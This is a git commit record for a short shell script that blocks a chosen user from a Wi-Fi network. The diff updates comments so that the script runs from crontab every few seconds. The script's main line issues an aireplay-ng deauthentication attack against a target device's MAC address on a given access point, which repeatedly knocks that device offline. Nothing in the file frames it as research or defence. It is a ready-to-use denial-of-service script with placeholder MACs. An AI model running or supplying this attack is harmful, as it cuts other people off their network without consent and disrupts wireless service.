a02de3fc9f243c9a24c86691509daac169dc3f81
Blake Ryder <droidbit1@gmail.com>
2018-10-30 23:41:53 +0530

    Update block_user_over_wifi.sh

--- block_user_over_wifi.sh
+++ block_user_over_wifi.sh
@@ -7,8 +7,9 @@ LANG=en_US.UTF-8
 SHELL=/bin/sh
 PWD=/root
 
-#install aircarak-ng
-#add the script to crontab every 5 secs
+# install aircarak-ng
+# add the script to crontab every 3 secs
+# */3 * * * * /root/Documents/block_user.sh
 
 aireplay-ng -0 1 -a <Access-Point-MAC> -c <Target-MAC> wlan0
 
